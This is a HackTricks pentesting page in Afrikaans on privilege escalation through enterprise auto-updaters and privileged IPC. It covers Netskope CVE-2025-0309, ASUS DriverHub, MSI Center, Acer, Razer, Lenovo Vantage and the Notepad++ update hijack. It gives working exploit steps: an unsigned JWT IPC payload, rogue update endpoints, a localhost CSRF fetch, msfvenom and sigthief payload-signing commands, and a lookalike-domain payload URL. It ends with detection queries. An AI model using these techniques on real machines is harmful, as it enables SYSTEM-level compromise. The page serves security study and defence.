# Misbruik Enterprise Auto-Updaters en Geprivilegieerde IPC (bv. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy veralgemeen 'n klas van Windows local privilege escalation-kettings wat in enterprise endpoint agents en updaters gevind word wat 'n lae-wrywing IPC-oppervlak en 'n geprivilegieerde update-vloei blootstel. 'n Verteenwoordigende voorbeeld is Netskope Client for Windows < R129 (CVE-2025-0309), waar 'n gebruiker met lae voorreg die enrollment na 'n aanvaller-beheerde server kan afdwing en dan 'n kwaadwillige MSI kan lewer wat die SYSTEM-diens installeer.

Kernidees wat jy teen soortgelyke produkte kan hergebruik:
- Misbruik 'n geprivilegieerde diens se localhost IPC om re-enrollment of herkonfigurasie na 'n aanvaller server af te dwing.
- Implementeer die vendor se update-endpoints, lewer 'n rogue Trusted Root CA, en wys die updater na 'n kwaadwillige, “signed” pakket.
- Ontduik swak signer checks (CN allow-lists), opsionele digest flags, en lakse MSI properties.
- As IPC “encrypted” is, lei die key/IV af van world-readable machine identifiers wat in die registry gestoor is.
- As die diens callers deur image path/process name beperk, inject in 'n allow-listed process of spawn een suspended en bootstrap jou DLL via 'n minimale thread-context patch.

---
## 1) Dwing enrollment na 'n aanvaller server via localhost IPC

Baie agents ship 'n user-mode UI-proses wat oor localhost TCP met 'n SYSTEM-diens kommunikeer deur JSON.

Waargeneem in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Craft 'n JWT enrollment token wie se claims die backend host beheer (bv. AddonUrl). Gebruik alg=None sodat geen signature vereis word nie.
2) Stuur die IPC-boodskap wat die provisioning command aanroep met jou JWT en tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Die diens begin jou rogue server tref vir enrollment/config, bv.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- As caller verification pad/naam-gebaseer is, laat die request vanaf ’n allow-listed vendor binary kom (sien §4).

---
## 2) Hijacking die update channel om code as SYSTEM te run

Sodra die client met jou server praat, implementeer die verwagte endpoints en stuur dit na ’n attacker MSI. Tipiese sequence:

1) /v2/config/org/clientconfig → Gee JSON config terug met ’n baie kort updater interval, bv.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Gee ’n PEM CA-sertifikaat terug. Die diens installeer dit in die Local Machine Trusted Root store.
3) /v2/checkupdate → Verskaf metadata wat na ’n kwaadwillige MSI en ’n vals weergawe wys.

Omseiling van algemene checks wat in die wild gesien word:
- Signer CN allow-list: die diens kan dalk net check dat die Subject CN gelyk is aan “netSkope Inc” of “Netskope, Inc.”. Jou rogue CA kan ’n leaf met daardie CN uitreik en die MSI teken.
- CERT_DIGEST property: sluit ’n onskadelike MSI property met die naam CERT_DIGEST in. Geen enforcement by install nie.
- Optional digest enforcement: config flag (bv. check_msi_digest=false) skakel ekstra cryptographic validation af.

Resultaat: die SYSTEM-diens installeer jou MSI vanaf
C:\ProgramData\Netskope\stAgent\data\*.msi
en voer arbitrary code uit as NT AUTHORITY\SYSTEM.

Patch-bypass-les: as ’n vendor reageer deur ’n klein stel “trusted” domains te allow-list in plaas daarvan om die update source cryptographically te authenticatie, soek vir vendor-owned redirectors of reverse proxies wat jou steeds toelaat om traffic te stuur. In Netskope se geval het publieke follow-up research getoon dat ’n R129-era allow-list nog steeds misbruik kon word deur `rproxy.goskope.com`, wat attacker-controlled Azure App Service content geproxie het. Beskou hostname allow-lists as ’n speed bump, nie as ’n trust boundary nie.

---
## 3) Forging encrypted IPC requests (when present)

Vanaf R127 het Netskope IPC JSON in ’n encryptData field toegedraai wat soos Base64 lyk. Reversing het gewys AES met key/IV afgelei van registry values wat deur enige gebruiker leesbaar is:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers kan encryption reproduseer en geldige encrypted commands vanaf ’n standard user stuur. Algemene wenk: as ’n agent skielik sy IPC “encrypt”, soek vir device IDs, product GUIDs, install IDs onder HKLM as materiaal.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Sommige services probeer die peer authenticate deur die TCP connection se PID op te los en die image path/name te vergelyk met allow-listed vendor binaries wat onder Program Files geleë is (bv. stagentui.exe, bwansvc.exe, epdlp.exe).

Twee praktiese bypasses:
- DLL injection in ’n allow-listed process (bv. nsdiag.exe) en proxy IPC van binne dit.
- Spawn ’n allow-listed binary suspended en bootstrap jou proxy DLL sonder CreateRemoteThread (sien §5) om driver-enforced tamper rules te satisfy.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products ship dikwels ’n minifilter/OB callbacks driver (bv. Stadrv) om gevaarlike rights van handles na protected processes te strip:
- Process: verwyder PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: beperk tot THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

’n Betroubare user-mode loader wat hierdie constraints respekteer:
1) CreateProcess van ’n vendor binary met CREATE_SUSPENDED.
2) Verkry handles wat jy steeds mag hê: PROCESS_VM_WRITE | PROCESS_VM_OPERATION op die process, en ’n thread handle met THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (of net THREAD_RESUME as jy code op ’n bekende RIP patch).
3) Oorskryf ntdll!NtContinue (of ’n ander vroeë, guaranteed-mapped thunk) met ’n klein stub wat LoadLibraryW op jou DLL path call, en dan terug jump.
4) ResumeThread om jou stub in-process te trigger en jou DLL te load.

Omdat jy nooit PROCESS_CREATE_THREAD of PROCESS_SUSPEND_RESUME op ’n reeds protected process gebruik het nie (jy het dit self geskep), is die driver se policy satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automateer ’n rogue CA, malicious MSI signing, en bedien die nodige endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is ’n custom IPC client wat arbitrary (optioneel AES-encrypted) IPC messages craft en die suspended-process injection insluit om vanaf ’n allow-listed binary te originate.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Wanneer jy ’n nuwe endpoint agent of motherboard “helper” suite teëkom, is ’n vinnige workflow gewoonlik genoeg om te sê of jy na ’n belowende privesc target kyk:

1) Enumereer loopback listeners en map hulle terug na vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Lys kandidaat benoemde pype:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Ontgin register-ondersteunde routeringsdata wat deur plugin-gebaseerde IPC servers gebruik word:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Onttrek eers endpoint name, JSON keys, en command IDs uit die user-mode client. Packed Electron/.NET frontends lek dikwels die full schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Jag vir die werklike trust-predikaat, nie net die kodepad wat uiteindelik die proses begin nie:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patrone wat prioriteit verdien:
- `CryptQueryObject`/sertifikaat-ontleding sonder `WinVerifyTrust` beteken gewoonlik “sertifikaat bestaan” is behandel as “sertifikaat is trusted”, wat sertifikaat-kloning of ander fake-signer-truuks moontlik maak.
- Substring-/suffix-kontroles oor `Origin`, `Referer`, aflaaibane, prosesname, of signer CNs is nie authentication nie. `contains(".vendor.com")` is gewoonlik uitbuitbaar met aanvaller-beheerde lookalike domains.
- As die lae-privilege GUI besluit “the file is trusted” en die SYSTEM broker bloot daardie resultaat verbruik, om die client-side DLL/JS te patch of herimplementeer omseil die boundary dikwels heeltemal (Razer-style split validation).
- As die broker ’n payload na `%TEMP%`/`C:\Windows\Temp` kopieer en dit dan van daardie path af valideer of skeduleer, toets onmiddellik vir TOCTOU replacement windows en vir sibling plugin modules wat alternatiewe `ExecuteTask()` wrappers met swakker kontroles blootstel.

Vir targets met swaar gebruik van named pipes is PipeViewer ’n vinnige manier om weak DACLs en remotely reachable pipes raak te sien voordat jy die protocol in depth begin reverse.

As die target callers net deur PID, image path, of process name authenticatieer, behandel dit as ’n speed bump eerder as ’n boundary: injecting in die legit client, of die connection maak vanaf ’n allow-listed process, is dikwels genoeg om die server se kontroles te bevredig. Vir named pipes spesifiek dek [hierdie bladsy oor client impersonation en pipe abuse](named-pipe-client-impersonation.md) die primitive in meer diepte.

---
## 8) Modular add-in brokers authenticated only by vendor signatures (Lenovo Vantage pattern)

’n Nuwe variasie wat die moeite werd is om te jag, is die **signed-client RPC broker**: ’n lae-privilege Lenovo-signed desktop process praat met ’n SYSTEM service, en die service roeteer JSON commands in ’n stel XML-beskryfde add-ins onder `%ProgramData%`. Sodra code execution **binne enige accepted signed client** bereik is, word elke `runas="system"` contract deel van jou attack surface.

Hoëwaarde primitives wat in Lenovo Vantage research waargeneem is:
- **Die caller vertrou omdat dit deur die vendor gesigned is**: navorsers het ’n authenticated context bereik deur ’n Lenovo-signed EXE na ’n writable directory te kopieer en ’n DLL side-load (`profapi.dll`) te bevredig sodat arbitrary code binne ’n client loop wat die service reeds vertrou het.
- **Manifest-driven attack surface discovery**: add-ins word onder `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` verklaar; verskeie contracts loop as `SYSTEM`, so die inventarisering van daardie manifests onthul dikwels die werklike privileged verbs vinniger as om die broker self te reverse.
- **Per-command bugs agter die authenticated channel**: sodra jy binne die trusted client is, het publieke research path-traversal + race conditions in update/install verbs, raw-SQL abuse in privileged settings databases, en substring-gebaseerde registry path checks gevind wat writes buite die bedoelde hive moontlik gemaak het.

Nuttige recon op ’n target:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Praktiese wegneemete: wanneer ’n helper suite ’n broker blootstel wat eers die **caller process** verifieer en eers daarna in dosyne plugin/add-in commandse dispatch, moenie ophou nadat jy die front-door trust check omseil het nie. Dump die manifest/contract table en fuzz elke high-privilege verb independently; die authenticated channel versteek gewoonlik verskeie second-stage bugs.

---
## 1) Browser-to-localhost CSRF teen privileged HTTP APIs (ASUS DriverHub)

DriverHub ship ’n user-mode HTTP service (ADU.exe) op 127.0.0.1:53000 wat browser calls verwag wat van https://driverhub.asus.com af kom. Die origin filter voer eenvoudig `string_contains(".asus.com")` uit oor die Origin header en oor download URLs wat deur `/asus/v1.0/*` blootgestel word. Enige attacker-controlled host soos `https://driverhub.asus.com.attacker.tld` slaag daarom die check en kan state-changing requests vanaf JavaScript uitreik. Sien [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) vir addisionele bypass patterns.

Praktiese flow:
1) Registreer ’n domain wat `.asus.com` embed en host ’n malicious webpage daar.
2) Gebruik `fetch` of XHR om ’n privileged endpoint (bv. `Reboot`, `UpdateApp`) op `http://127.0.0.1:53000` te roep.
3) Stuur die JSON body wat die handler verwag – die packed frontend JS toon die schema hieronder.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Selfs die PowerShell CLI wat hieronder gewys word, slaag wanneer die Origin-kop na die vertroude waarde gespoof word:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Enige browserbesoek aan die attacker-site word dus 'n 1-click (of 0-click via `onload`) local CSRF wat 'n SYSTEM helper aanstuur.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` laai arbitrary executables af wat in die JSON body gedefinieer is en cache hulle in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation hergebruik dieselfde substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` word aanvaar. Ná download kyk ADU.exe net of die PE 'n signature bevat en of die Subject string met ASUS ooreenstem voordat dit loop – geen `WinVerifyTrust`, geen chain validation nie.

Om die flow te weaponize:
1) Skep 'n payload (bv. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS se signer daarin (bv. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` op 'n `.asus.com` lookalike domain en trigger UpdateApp via die browser CSRF hierbo.

Omdat beide die Origin- en URL-filters substring-based is en die signer check net strings vergelyk, haal DriverHub die attacker binary af en execute dit onder sy elevated context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center se SYSTEM service expose 'n TCP protocol waar elke frame `4-byte ComponentID || 8-byte CommandID || ASCII arguments` is. Die core component (Component ID `0f 27 00 00`) ship `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Sy handler:
1) Kopieer die supplied executable na `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verify die signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject moet gelyk wees aan “MICRO-STAR INTERNATIONAL, CO., LTD.” en `WinVerifyTrust` slaag).
3) Skep 'n scheduled task wat die temp file as SYSTEM met attacker-controlled arguments run.

Die gekopieerde file is nie tussen verification en `ExecuteTask()` gelock nie. 'n Attacker kan:
- Frame A stuur wat na 'n legit MSI-signed binary wys (verseker dat die signature check slaag en die task gequeued word).
- Dit race met herhaalde Frame B messages wat na 'n malicious payload wys, en `MSI Center SDK.exe` oorskryf net ná verification voltooi.

Wanneer die scheduler fire, execute dit die overwritten payload onder SYSTEM ten spyte daarvan dat die original file gevalideer is. Betroubare exploitation gebruik twee goroutines/threads wat CMD_AutoUpdateSDK spam totdat die TOCTOU window gewen word.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Elke plugin/DLL wat deur `MSI.CentralServer.exe` gelaai word, ontvang 'n Component ID wat onder `HKLM\SOFTWARE\MSI\MSI_CentralServer` gestoor is. Die eerste 4 bytes van 'n frame kies daardie component, wat attackers toelaat om commands na arbitrary modules te route.
- Plugins kan hul eie task runners definieer. `Support\API_Support.dll` expose `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` en roep direk `API_Support.EX_Task::ExecuteTask()` aan met **geen signature validation** nie – enige local user kan dit na `C:\Users\<user>\Desktop\payload.exe` wys en deterministiese SYSTEM execution kry.
- Sniffing loopback met Wireshark of die .NET binaries in dnSpy instrumenteer, onthul vinnig die Component ↔ command mapping; custom Go/ Python clients kan dan frames replay.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) expose `\\.\pipe\treadstone_service_LightMode`, en sy discretionary ACL laat remote clients toe (bv. `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` met 'n file path roep die service se process-spawning routine aan.
- Die client library serialiseer 'n magic terminator byte (113) saam met args. Dynamic instrumentation met Frida/`TsDotNetLib` (sien [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) vir instrumentation tips) wys dat die native handler hierdie waarde na 'n `SECURITY_IMPERSONATION_LEVEL` en integrity SID map voor dit `CreateProcessAsUser` aanroep.
- Vervang 113 (`0x71`) met 114 (`0x72`) laat val in die generic branch wat die volle SYSTEM token behou en 'n high-integrity SID (`S-1-16-12288`) stel. Die spawned binary run dus as unrestricted SYSTEM, beide plaaslik en cross-machine.
- Kombineer dit met die exposed installer flag (`Setup.exe -nocheck`) om ACC selfs op lab VMs op te sit en die pipe sonder vendor hardware te exercise.

Hierdie IPC bugs wys hoekom localhost services mutual authentication moet enforce (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) en hoekom elke module se “run arbitrary binary” helper dieselfde signer verifications moet deel.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 het nog 'n nuttige pattern by hierdie familie gevoeg: 'n low-privileged user kan 'n COM helper vra om 'n process via `RzUtility.Elevator` te launch, terwyl die trust decision aan 'n user-mode DLL (`simple_service.dll`) gedelegeer word eerder as om robuust binne die privileged boundary enforced te word.

Observed exploitation path:
- Instantiate die COM object `RzUtility.Elevator`.
- Roep `LaunchProcessNoWait(<path>, "", 1)` aan om 'n elevated launch te request.
- In die public PoC word die PE-signature gate binne `simple_service.dll` gepatch voordat die request gestuur word, wat toelaat dat 'n arbitrary attacker-chosen executable gelanceer word.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Algemene kernpunt: wanneer jy “helper” suites omkeer, moenie by localhost TCP of named pipes stop nie. Kyk vir COM classes met name soos `Elevator`, `Launcher`, `Updater`, of `Utility`, en verifieer dan of die bevoorregte service werklik die teiken-binary self valideer of bloot ’n resultaat vertrou wat deur ’n patchable user-mode client DLL bereken is. Hierdie patroon strek verder as Razer: enige split design waar die high-privilege broker ’n allow/deny decision van die low-privilege kant verbruik, is ’n kandidaat privesc surface.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Tussen Junie 2025 en Desember 2025 het attackers wat die hosting infrastructure agter die Notepad++ update flow gekompromitteer het, selektief malicious manifests aan gekose victims bedien. Ouer WinGUp-based updaters het nie update authenticity volledig geverifieer nie, so ’n hostile XML response kon clients na attacker-controlled URLs herlei. Omdat die client HTTPS content aanvaar het sonder om beide ’n trusted certificate chain en ’n geldige PE signature op die afgelaaide installer af te dwing, het victims ’n trojanized NSIS `update.exe` gaan haal en uitgevoer.

Operational flow (no local exploit required):
1. **Infrastructure interception**: compromise CDN/hosting en antwoord update checks met attacker metadata wat na ’n malicious download URL wys.
2. **Trojanized NSIS**: the installer fetches/executes a payload and abuses two execution chains:
- **Bring-your-own signed binary + sideload**: bundle die signed Bitdefender `BluetoothService.exe` en laat val ’n malicious `log.dll` in sy search path. Wanneer die signed binary loop, sideload Windows `log.dll`, wat die Chrysalis backdoor decrypt en reflectively load (Warbird-protected + API hashing om static detection te bemoeilik).
- **Scripted shellcode injection**: NSIS execute ’n compiled Lua script wat Win32 APIs gebruik (bv. `EnumWindowStationsW`) om shellcode in te spuit en Cobalt Strike Beacon te stage.

Hardening/detection takeaways for any auto-updater:
- Dwing **certificate + signature verification** van die afgelaaide installer af (pin vendor signer, reject mismatched CN/chain) en sign die update manifest self (bv. XMLDSig). Blokkeer manifest-controlled redirects tensy dit geverifieer is.
- Behandel **BYO signed binary sideloading** as ’n post-download detection pivot: alert wanneer ’n signed vendor EXE ’n DLL name van buite sy canonical install path laai (bv. Bitdefender wat `log.dll` vanaf Temp/Downloads laai) en wanneer ’n updater installers vanaf temp drop/execute met non-vendor signatures.
- Monitor **malware-specific artifacts** wat in hierdie chain waargeneem is (nuttig as generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes na `%TEMP%`, en Lua-driven shellcode injection stages.
- Notepad++ het gereageer deur WinGUp in v8.8.9 en later te versterk: die teruggestuurde XML is nou signed (XMLDSig), en nuwer builds dwing certificate + signature verification van die afgelaaide installer af in plaas daarvan om net die transport te vertrou.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> launching a non-Notepad++ installer</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Hierdie patrone veralgemeen na enige updater wat unsigned manifests aanvaar of versuim om installer signers te pin—network hijack + malicious installer + BYO-signed sideloading lewer remote code execution onder die voorwendsel van “trusted” updates.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
